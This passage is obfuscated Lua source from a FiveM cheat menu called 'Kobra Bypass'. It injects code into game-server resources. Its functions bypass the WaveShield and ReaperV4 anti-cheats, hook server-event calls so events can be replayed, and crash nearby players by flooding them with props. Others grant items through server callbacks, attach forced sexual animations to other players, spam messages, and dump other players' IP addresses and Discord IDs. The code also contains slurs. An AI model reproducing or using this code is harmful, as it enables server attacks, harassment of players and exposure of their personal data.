                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);else v12:Notify("error","Kobra","Unlimited Fuel Off",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v460=0 -0 ;while true do if (0==v460) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v461={};for v563,v564 in pairs(v27) do if v564 then v461[ #v461 + 1 + 0 ]=v563;end end if ( #v461==0) then local v616=202 -(5 + 197) ;while true do if (v616==(686 -(339 + 347))) then v277:Notify("error","Kobra","You must select a player first!",3000);return;end end end for v565,v566 in ipairs(v461) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v566,v566));end v277:Notify("success","Kobra","Attempted to twerk on "   ..  #v461   .. " player(s)." ,9065 -5065 );end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v462={};for v567,v568 in pairs(v27) do if v568 then v462[ #v462 + 1 + 0 ]=v567;end end if ( #v462==(0 -0)) then local v617=0 -0 ;while true do if (v617==(924 -(837 + 87))) then v277:Notify("error","Kobra","You must select a player first!",5087 -2087 );return;end end end for v569,v570 in ipairs(v462) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v570,v570));end v277:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v462   .. " player(s)." ,4000);end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v463=1670 -(837 + 833) ;local v464;local v465;while true do if (v463==1) then if v464 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v465 then MachoInjectThread(0 + 0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end if (v463==(1387 -(356 + 1031))) then v464=GetResourceState("WaveShield")=="started" ;v465=GetResourceState("ReaperV4")=="started" ;v463=1 + 0 ;end end end},{type="button",label="Mission Row PD",onSelect=function() local v466=1646 -(73 + 1573) ;local v467;local v468;while true do if (v466==(1389 -(1307 + 81))) then if v467 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v468 then MachoInjectThread(0,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end break;end if ((234 -(7 + 227))==v466) then v467=GetResourceState("WaveShield")=="started" ;v468=GetResourceState("ReaperV4")=="started" ;v466=1 -0 ;end end end},{type="button",label="Pillbox Hospital",onSelect=function() local v469=GetResourceState("WaveShield")=="started" ;local v470=GetResourceState("ReaperV4")=="started" ;if v469 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v470 then MachoInjectThread(0,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v471=0 + 0 ;local v472;local v473;while true do if (1==v471) then if v472 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v473 then MachoInjectThread(0,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end break;end if (v471==0) then v472=GetResourceState("WaveShield")=="started" ;v473=GetResourceState("ReaperV4")=="started" ;v471=1 + 0 ;end end end},{type="button",label="Legion Square",onSelect=function() local v474=GetResourceState("WaveShield")=="started" ;local v475=GetResourceState("ReaperV4")=="started" ;if v474 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v475 then MachoInjectThread(0,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v60("Choose Menu Key","",function(v571) for v618,v619 in pairs(v44) do if (v619:lower()==v571:lower()) then local v811=0 + 0 ;while true do if ((0 + 0)==v811) then v23=v619;Wait(42 + 208 );v811=1;end if (1==v811) then v12:ShowUI();return;end end end end end,"keybind");end}}},{type="subMenu",label="Banners",subTabs={{icon="",type="button",label="Kobra (Default)",onSelect=function() v12:SendMessage({action="updateBanner",bannerColor="150, 0, 0",bannerLink="https://jaythaagamer.simdif.com/images/th/sd_6935ae44db1fd.png?no_cache=1765129304"});end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1370 -(618 + 751) ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1 -0 ,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=1 + 0 ;v15=1276 -(155 + 1120) ;end;local function v97(v278) for v476,v477 in ipairs(v16) do if (v477.label=="Server") then for v750,v751 in ipairs(v477.categories) do if (v751.label=="Triggers") then v751.tabs[ #v751.tabs + (1507 -(396 + 1110)) ]=v278;return;end end end end end v12.UpdateTabChecked=function(v279,v280,v281,v282) for v478,v479 in pairs(v280 or {} ) do if ((v479.label==v281) and ((v479.type=="checkbox") or (v479.type=="slider-checkbox") or v479.type:find("checkbox"))) then v479.checked=v282;elseif (v479.type=="subMenu") then local v812=0 -0 ;while true do if (v812==(0 + 0)) then if v479.categories then for v1184,v1185 in pairs(v479.categories) do v279:UpdateTabChecked(v1185.tabs,v281,v282);end end if v479.subTabs then v279:UpdateTabChecked(v479.subTabs,v281,v282);end break;end end end end end;v12.ShowKeybindList=function(v283,v284) v283:SendMessage({action="displayBinds",visible=true,binds=v284});end;v12.HideKeybindList=function(v285) v285:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v286,v287,v288,v289) local v290=0;local v291;local v292;local v293;while true do if (v290==(3 + 0)) then if ( #v291==0) then v291={};end return v291;end if (v290==(2 + 0)) then v293=GetActivePlayers();if v293 then for v866,v867 in ipairs(v293) do if (v289 or (v867~=PlayerId())) then local v1001=GetPlayerPed(v867);if (v1001 and DoesEntityExist(v1001) and IsEntityAPed(v1001) and  not IsEntityDead(v1001)) then local v1116=GetEntityCoords(v1001);if v1116 then local v1231=976 -(230 + 746) ;local v1232;while true do if (v1231==(601 -(473 + 128))) then v1232= #(v287-v1116);if (v1232<=v288) then v291[ #v291 + (49 -(39 + 9)) ]={name=GetPlayerName(v867),serverId=GetPlayerServerId(v867)};end break;end end end end end end else local v813,v814=FindFirstPed();local v815;repeat if (v814 and IsPedAPlayer(v814) and DoesEntityExist(v814)) then local v1002=NetworkGetPlayerIndexFromPed(v814);if ((v1002~= -(267 -(38 + 228))) and (v289 or (v1002~=PlayerId()))) then local v1117=GetEntityCoords(v814);if v1117 then local v1233= #(v287-v1117);if (v1233<=v288) then v291[ #v291 + (1 -0) ]={name=GetPlayerName(v1002),serverId=GetPlayerServerId(v1002)};end end end end v815,v814=FindNextPed(v813);until  not v815 EndFindPed(v813);end v290=476 -(106 + 367) ;end if (v290==0) then v291={};v292=PlayerPedId();v290=1;end if (v290==1) then v288=v288 or 350 ;if ( not v292 or  not DoesEntityExist(v292) or  not IsPlayerPlaying(PlayerId())) then local v816=0;while true do if (v816==(0 + 0)) then v291={};return v291;end end end v290=2;end end end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(2862 -(354 + 1508) );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",9628 -6628 );Wait(1000);v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",2192 + 808 );Wait(587 + 413 );v97({type="button",label="Bypass WaveShield [Risky]",onSelect=function() if (GetResourceState("WaveShield")~="started") then local v621=0 -0 ;while true do if (v621==(1244 -(334 + 910))) then v12:Notify("info","Kobra","WaveShield not detected.",3895 -(92 + 803) );return;end end end for v572=1,2 + 0  do MachoInjectResource2(3,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v12:Notify("success","Kobra","WaveShield bypass attempted.",4181 -(1035 + 146) );end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v97({type="button",label="DeFXAP Events",onSelect=function() local v622=0;local v623;local v624;local v625;while true do if ((617 -(230 + 386))==v622) then while  not v624 do Wait(59 + 41 );end if ( not v623 or (v623=="")) then local v1003=0;while true do if (v1003==(1510 -(353 + 1157))) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();v1003=1;end if (v1003==(1115 -(53 + 1061))) then return;end end end if (GetResourceState(v623)~="started") then MachoMenuNotification("Error","Resource ^3"   .. v623   .. "^7 is not started or doesn’t exist." );v12:ShowUI();return;end v625=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v622=1637 -(1568 + 67) ;end if (v622==(1 + 1)) then v48(v623,v625);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v623   .. "^7 successfully!" );v12:ShowUI();break;end if (v622==(0 + 0)) then v12:HideUI();v623=nil;v624=false;v60("Resource Name","",function(v947) local v948=0 -0 ;while true do if (v948==(0 -0)) then if (v947 and (v947~="")) then v623=v947;end v624=true;break;end end end,"typeable");v622=1;end end end});end if (GetResourceState("ox_lib")=="started") then v97({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v626=0 -0 ;while true do if (0==v626) then if (GetResourceState("WaveShield")=="started") then local v1004=0;while true do if (0==v1004) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",2831 + 169 );return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="BRING NEARBY PLAYERS",onSelect=function() v12:Notify("success","Kobra","Attempting to bring all players",4212 -(615 + 597) );MachoInjectThread(0 + 0 ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);end});end if (GetResourceState("mc9-adminmenu")=="started") then v97({type="button",label="ADMIN MENU (F8)",onSelect=function() local v627=0;while true do if ((0 -0)==v627) then v12:Notify("success","Kobra","Admin Menu List",2467 + 533 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v97({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() v12:Notify("success","Kobra","Spawning Items",60 + 2940 );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);end});end if (GetResourceState("vMenu")=="started") then v97({type="button",label="HIT DMS",onSelect=function() v12:Notify("success","Kobra","Message Sent",1651 + 1349 );MachoInjectResource2(1900 -(1056 + 843) ,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);end});end if (GetResourceState("amigo")=="started") then v97({type="button",label="ADD ITEM (1)",onSelect=function() local v628=0;local v629;local v630;local v631;local v632;local v633;local v634;while true do if (v628==1) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v630=v629("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v630));v628=3 -1 ;end if (v628==(0 -0)) then v12:HideUI();v629=nil;function v629(v949,v950) local v951=0 -0 ;local v952;local v953;while true do if (v951==(0 + 0)) then v952=nil;v953=false;v951=1;end if (2==v951) then return v952;end if (v951==1) then v60(v949,v950 or "" ,function(v1186) local v1187=1976 -(286 + 1690) ;while true do if (0==v1187) then v952=v1186;v953=true;break;end end end,"typeable");while  not v953 do Wait(911 -(98 + 813) );end v951=1 + 1 ;end end end v628=2 -1 ;end if (v628==2) then if ( not v630 or (v630=="")) then local v1005=0 + 0 ;while true do if (v1005==(507 -(263 + 244))) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",2375 + 625 );v1005=1688 -(1502 + 185) ;end if (v1005==(1 + 0)) then v12:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v631=v629("Item Count","1");v628=14 -11 ;end if (v628==3) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v631));v632=tonumber(v631);if ( not v632 or (v632<1)) then local v1006=0 -0 ;while true do if (v1006==(1527 -(629 + 898))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v632=2 -1 ;break;end end end v628=10 -6 ;end if ((370 -(12 + 353))==v628) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v630);print("^7[^5Kobra^7] 